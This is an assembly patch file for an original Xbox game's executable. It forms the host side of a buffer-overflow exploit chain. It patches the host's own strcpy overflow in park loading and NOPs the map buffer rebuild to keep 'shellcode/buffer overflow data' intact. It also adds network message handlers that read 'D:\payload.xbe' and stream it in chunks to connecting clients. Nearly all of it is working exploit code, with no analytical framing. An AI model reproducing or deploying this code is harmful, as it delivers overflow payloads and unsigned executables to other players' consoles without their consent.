; ////////////////////////////////////////////////////////
; ////////////////// Preprocessor Stuff //////////////////
; ////////////////////////////////////////////////////////
;.686p  ; processor type
;.xmm   ; adds sse support
;.model tiny
;.code
;       org 0               ; tells masm to start assembling at file offset 0x0

        BITS 32     

%define ExecutableBaseAddress           00010000h           ; Base address of the executable
%define HacksSegmentAddress             0030c000h           ; Virtual address of the .hacks segment
%define HacksSegmentOffset              001d1000h           ; File offset of the .hacks segment
%define HacksSegmentSize                4096                ; Size of the .hacks segment

; Macros
%macro HACK_FUNCTION 1
    %define %1          HacksSegmentAddress + (_%1 - _hacks_code_start)
%endmacro

%macro HACK_DATA 1
    %define %1          HacksSegmentAddress + (_%1 - _hacks_code_start)
%endmacro

; Function addresses
%define CreateFileA                     00101549h
%define GetFileSize                     0010141Eh
%define ReadFile                        00100FB0h
%define CloseHandle                     00101459h
%define lstrcpynA                       0010409Bh
%define malloc                          0010EA03h
%define free                            0010D94Dh

; Net::Dispatcher
%define Net__Dispatcher__AddHandler     0002F8B0h

; Net::Server
%define Net__Server__StreamMessage      0002EBB0h

; Net::Manager
%define Net__Manager__GetPlayerByConnection     00073360h

HACK_FUNCTION Hack_LoadParkDetour
HACK_FUNCTION Hack_SpawnServerDetour
HACK_FUNCTION Hack_LoadPayload

HACK_FUNCTION Hack_s_handle_payload_request
HACK_FUNCTION Hack_s_handle_payload_data
HACK_FUNCTION Hack_s_handle_read_file_request

HACK_DATA Hack_PayloadFileName
HACK_DATA Hack_PayloadMsgDescription
HACK_DATA Hack_PayloadSize
HACK_DATA Hack_PayloadPtr

; Custom message IDs
%define MSG_ID_PAYLOAD_REQUEST          200
%define MSG_ID_PAYLOAD_DATA             201

%define PAYLOAD_MSG_ID_START            0   ; Value = size of the file
%define PAYLOAD_MSG_ID_DATA             1   ; Value = offset of data
%define PAYLOAD_MSG_ID_END              2   ; 

; struct PayloadData
; {
;       DWORD Id;           ; Message ID
;       DWORD Value;        ; optional value, can be file size or offset of data depending on the message
; };

;---------------------------------------------------------
; load park hook
;---------------------------------------------------------
dd          (000EC72Fh - ExecutableBaseAddress)
dd          (load_park_hook_end - load_park_hook_start)
load_park_hook_start:

    ; Hook and jump to our code cave.
    mov     edx, Hack_LoadParkDetour
    call    edx

    ; nop sled to fill remaining instructions.
    nop
    nop
    nop
    nop
    
load_park_hook_end:

;---------------------------------------------------------
; Stop compressed map buffer from being re-built
;---------------------------------------------------------
dd          (00075599h - ExecutableBaseAddress)
dd          (write_map_buffer_end - write_map_buffer_start)
write_map_buffer_start:

    ; NOP the function call to CParkManager::WriteCompressedMapBuffer, this stops
    ; the map buffer from being rewritten and trashing our shellcode/buffer overflow data.
    nop
    nop
    nop
    nop
    nop

write_map_buffer_end:

;---------------------------------------------------------
; Manager::SpawnServer() -> hook so we can add our custom message handlers
;---------------------------------------------------------
dd          (000741C6h - ExecutableBaseAddress)
dd          (_spawn_server_hook_end - _spawn_server_hook_start)
_spawn_server_hook_start:

    ; Hook to our code cave so we can add our custom message type handlers.
    mov     ecx, Hack_SpawnServerDetour
    call    ecx
    
    ; NOP sled for instructions we overwrote
    nop
    nop
    nop
    nop
    nop

_spawn_server_hook_end:

;---------------------------------------------------------
; .hacks code segment
;---------------------------------------------------------
dd          HacksSegmentOffset
dd          (_hacks_code_end - _hacks_code_start)
_hacks_code_start:

    ;---------------------------------------------------------
    ; Code cave for bug fix
    ;---------------------------------------------------------
_Hack_LoadParkDetour:

    ; Bug fix for the strcpy overflow ;)
    push    31                  ; max length to copy
    push    eax                 ; gap name in map buffer
    lea     edx, [esp+04Ch]     ; gap name buffer on stack
    push    edx
    mov     eax, lstrcpynA
    call    eax

    ; Return to the lark park function
    ret

    align 4, db 0

    ;---------------------------------------------------------
    ; Hook to add our custom message type handlers
    ;---------------------------------------------------------
_Hack_SpawnServerDetour:

    ; Try to load the payload and if we succeed the register our custom message handlers.
    mov     eax, Hack_LoadPayload
    call    eax
    cmp     eax, 1
    jne     _Hack_SpawnServerDetour_continue

    ; Add custom handler for MSG_ID_PAYLOAD_REQUEST.
    push    255                                 ; HIGHEST_PRIORITY 
    push    esi                                 ; Net::Manager*
    push    0                                   ; flags
    push    Hack_s_handle_payload_request       ; Handler function address
    push    MSG_ID_PAYLOAD_REQUEST              ; Message ID
    mov     ecx, [esi+20h]
    add     ecx, 0Ch                            ; this ptr
    mov     eax, Net__Dispatcher__AddHandler
    call    eax

    ; Add custom handler for MSG_ID_PAYLOAD_DATA.
    push    255                                 ; HIGHEST_PRIORITY 
    push    esi                                 ; Net::Manager*
    push    0                                   ; flags
    push    Hack_s_handle_payload_data          ; Handler function address
    push    MSG_ID_PAYLOAD_DATA                 ; Message ID
    mov     ecx, [esi+20h]
    add     ecx, 0Ch                            ; this ptr
    mov     eax, Net__Dispatcher__AddHandler
    call    eax
    
_Hack_SpawnServerDetour_continue:
    ; Replace the instructions we overwrote.
    mov     ecx, esi
    mov     dword [esi+13Ch], 0

    ret

    align 4, db 0

    ;---------------------------------------------------------
    ; bool Hack_LoadPayload() -> Loads the payload into memory for easy access
    ;---------------------------------------------------------
_Hack_LoadPayload:

    %define StackSize   014h
    %define StackStart  08h
    %define FileHandle  -08h        ; HANDLE hFileHandle
    %define BytesRead   -04h        ; DWORD BytesRead

    ; Setup stack frame.
    sub     esp, StackStart
    push    ebx
    push    edi
    push    ecx

    xor     ecx, ecx                ; result = false

    ; Check if the payload has already been loaded into memory.
    cmp     dword [Hack_PayloadPtr], 0
    jz      _Hack_LoadPayload_Continue
    jmp     _Hack_LoadPayload_Success

_Hack_LoadPayload_Continue:
    ; Try to open the payload file for reading.
    push    0                       ; hTemplate = NULL
    push    80h                     ; FILE_ATTRIBUTE_NORMAL
    push    3                       ; OPEN_EXISTING
    push    0                       ; lpSecurityAttributes = NULL
    push    0                       ; no file share
    push    80000000h               ; GENERIC_READ
    push    Hack_PayloadFileName    ; file name
    mov     eax, CreateFileA
    call    eax                     ; hFilehandle = CreateFileA("D:\\payload.xbe", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    cmp     eax, 0FFFFFFFFh         ; if (hFileHandle == INVALID_HANDLE_VALUE)
    jz      _Hack_LoadPayload_Done

    ; Save the file handle.
    mov     [esp+StackSize+FileHandle], eax

    ; Get the size of the payload file.
    push    0                       ; lpFileSizeHigh = NULL
    push    eax                     ; hFileHandle
    mov     eax, GetFileSize
    call    eax                     ; FileSize = GetFileSize(hFileHandle, NULL);
    cmp     eax, 0FFFFFFFFh         ; if (FileSize == INVALID_FILE_SIZE)
    jz      _Hack_LoadPayload_Done

    ; Save the file size.
    mov     [Hack_PayloadSize], eax

    ; Allocate a buffer to hold the payload.
    push    eax                     ; FileSize
    mov     eax, malloc
    call    eax                     ; pBuffer = malloc(FileSize);
    add     esp, 4                  ; cleanup from malloc
    cmp     eax, 0                  ; if (pBuffer == NULL)
    jz      _Hack_LoadPayload_Done

    ; Save the buffer address.
    mov     [Hack_PayloadPtr], eax

    ; Read the entire file into memory.
    lea     edi, [esp+StackSize+BytesRead]
    mov     ebx, [esp+StackSize+FileHandle]
    push    0                       ; lpOverlapped = NULL
    push    edi                     ; &BytesRead
    mov     edi, [Hack_PayloadSize]
    push    edi                     ; Hack_PayloadSize
    push    eax                     ; Hack_PayloadPtr
    push    ebx                     ; hFileHandle
    mov     eax, ReadFile
    call    eax                     ; result = ReadFile(hFileHandle, Hack_PayloadPtr, Hack_PayloadSize, &BytesRead, NULL);
    cmp     eax, 0                  ; if (result == FALSE)
    jz      _Hack_LoadPayload_Done

    ; Close the file handle.
    mov     edi, [esp+StackSize+FileHandle]
    push    edi                     ; hFileHandle
    mov     eax, CloseHandle
    call    eax                     ; CloseHandle(hFileHandle);

_Hack_LoadPayload_Success:
    ; Successfully loaded the payload.
    mov     ecx, 1

_Hack_LoadPayload_Done:
    ; Destroy stack frame and return.
    mov     eax, ecx
    pop     ecx
    pop     edi
    pop     ebx
    add     esp, StackStart
    ret

    align 4, db 0

    %undef StackSize
    %undef StackStart
    %undef FileHandle
    %undef BytesRead

    ;---------------------------------------------------------
    ; int __cdecl Hack_s_handle_payload_request(Net::MsgHandlerContext* context) -> Message handler for MSG_ID_PAYLOAD_REQUEST
    ;---------------------------------------------------------
_Hack_s_handle_payload_request:

    %define StackSize           18h
    %define StackStart          8h
    %define Msg_Id              -8h
    %define Msg_Value           -4h
    %define context             4h      ; Net::MsgHandlerContext* context

    ; Setup stack frame.
    sub     esp, StackStart
    push    ebx
    push    edx
    push    esi
    push    edi

    ; Setup the message header.
    lea     ebx, [esp+StackSize+Msg_Id]
    mov     dword [ebx], PAYLOAD_MSG_ID_START   ; pMsg->Id = PAYLOAD_MSG_ID_START
    mov     eax, dword [Hack_PayloadSize]
    mov     dword [ebx+4], eax                  ; pMsg->Value = Hack_PayloadSize

    ; Get the server instance from the context parameter.
    mov     esi, [esp+StackSize+context]
    mov     ecx, [esi+4004h]        ; server = context->m_App;

    ; Get the connection handle.
    mov     esi, [esi+4008h]
    mov     esi, [esi+3Ch]          ; connHandle = context->m_Conn->GetHandle();

    ; Send the entire payload to the client.
    push    8                               ; vSEQ_GROUP_PLAYER_MSGS
    push    Hack_PayloadMsgDescription      ; description = 'payload'
    push    ebx                             ; &Msg
    push    8                               ; sizeof(PayloadData)
    push    MSG_ID_PAYLOAD_DATA             ; message id
    push    esi                             ; connection handle
                                            ; ecx = Net::Server this ptr
    mov     eax, Net__Server__StreamMessage
    call    eax

_Hack_s_handle_payload_request_done:
    ; Destroy stack frame and return.
    mov     eax, 1                  ; return HANDLER_CONTINUE
    pop     edi
    pop     esi
    pop     edx
    pop     ebx
    add     esp, StackStart
    ret

    align 4, db 0

    %undef context
    %undef Msg_Value
    %undef Msg_Id
    %undef StackStart
    %undef StackSize

    ;---------------------------------------------------------
    ; int __cdecl Hack_s_handle_payload_data(Net::MsgHandlerContext* context) -> Message handler for MSG_ID_PAYLOAD_DATA
    ;---------------------------------------------------------
_Hack_s_handle_payload_data:

    %define StackSize       18h
    %define StackStart      4h
    %define MessageBuffer   -4h
    %define context         4h      ; Net::MsgHandlerContext* context

    ; Setup stack frame.
    sub     esp, StackStart
    push    ebx
    push    ecx
    push    edx
    push    esi
    push    edi

    ;db 0CCh

    ; Check the message type and handle accordingly.
    mov     ebx, [esp+StackSize+context]
    mov     ecx, dword [ebx]                    ; context->Id
    cmp     ecx, PAYLOAD_MSG_ID_DATA
    jz      _Hack_s_handle_payload_data_1       ; if (context->Id == PAYLOAD_MSG_ID_DATA)
    jmp     _Hack_s_handle_payload_data_done

_Hack_s_handle_payload_data_1:
        ; Allocate a buffer for the message.
        push    15000+8
        mov     eax, malloc
        call    eax                             ; pMsg = malloc(15000+8)
        add     esp, 4                          ; cleanup stack
        test    eax, eax                        ; if (pMsg == NULL)
        jnz     _Hack_s_handle_payload_data_2
        jmp     _Hack_s_handle_payload_data_done

_Hack_s_handle_payload_data_2:
        ; Setup the message header.
        mov     dword [esp+StackSize+MessageBuffer], eax
        mov     edx, eax
        mov     dword [edx], PAYLOAD_MSG_ID_DATA    ; pMsg->Id = PAYLOAD_MSG_ID_DATA
        mov     dword [edx+4], 15000                ; pMsg->Value = chunk size

        ; Get the chunk size of the payload.
        mov     ecx, 15000                          ; CopySize = 15000
        mov     eax, dword [ebx+4]                  ; context->Value
        add     eax, ecx
        cmp     eax, dword [Hack_PayloadSize]       ; if (context->Value + 15000 > Hack_PayloadSize)
        jb      _Hack_s_handle_payload_data_continue

            ; Last chunk for the payload.
            mov     dword [edx], PAYLOAD_MSG_ID_END ; pMsg->Id = PAYLOAD_MSG_ID_END
            mov     ecx, [Hack_PayloadSize]
            mov     eax, [ebx+4]                    ; context->Value is current offset
            sub     ecx, eax                        ; CopySize = Hack_PayloadSize - pMsg->Value
            mov     [edx+4], ecx                    ; pMsg->Value = CopySize

_Hack_s_handle_payload_data_continue:
        ; Copy the chunk data to the payload message buffer.
        mov     esi, [Hack_PayloadPtr]
        add     esi, dword [ebx+4]                  ; pSrc = Hack_PayloadPtr + context->Value (offset)
        lea     edi, [edx+8]                        ; pDst = pMsg + sizeof(PayloadData)
        rep     movsb                               ; memcpy(pDst, pSrc, CopySize);

        ; Get the server instance from the context parameter.
        mov     esi, [esp+StackSize+context]
        mov     ecx, [esi+4004h]        ; server = context->m_App;

        ; Get the connection handle.
        mov     esi, [esi+4008h]
        mov     esi, [esi+3Ch]          ; connHandle = context->m_Conn->GetHandle();

        ; Send the entire payload to the client.
        push    8                       ; vSEQ_GROUP_PLAYER_MSGS
        push    Hack_PayloadMsgDescription  ; description = 'payload'
        push    edx                     ; pMsg
        push    15000+8                 ; sizeof(PayloadData) + 15000
        push    MSG_ID_PAYLOAD_DATA     ; message id
        push    esi                     ; connection handle
                                        ; ecx = Net::Server this ptr
        mov     eax, Net__Server__StreamMessage
        call    eax

        ; Free the message buffer we allocated.
        mov     edx, [esp+StackSize+MessageBuffer]
        push    edx
        mov     eax, free
        call    eax                     ; free(pMsg);
        add     esp, 4                  ; cleanup stack

_Hack_s_handle_payload_data_done:
    ; Destroy the stack frame and return.
    pop     edi
    pop     esi
    pop     edx
    pop     ecx
    pop     ebx
    add     esp, StackStart
    mov     eax, 1                  ; return HANDLER_CONTINUE
    ret

    align 4, db 0

    %undef context
    %undef MessageBuffer
    %undef StackStart
    %undef StackSize

    ;---------------------------------------------------------
    ; Data
    ;---------------------------------------------------------

_Hack_PayloadFileName:
    db 'D:\payload.xbe',0
    align 4, db 0

_Hack_PayloadMsgDescription:
    db 'payload',0
    align 4, db 0

_Hack_PayloadSize:
    dd 0

_Hack_PayloadPtr:
    dd 0

_hacks_code_end:


; ////////////////////////////////////////////////////////
; //////////////////// End of file ///////////////////////
; ////////////////////////////////////////////////////////
dd -1
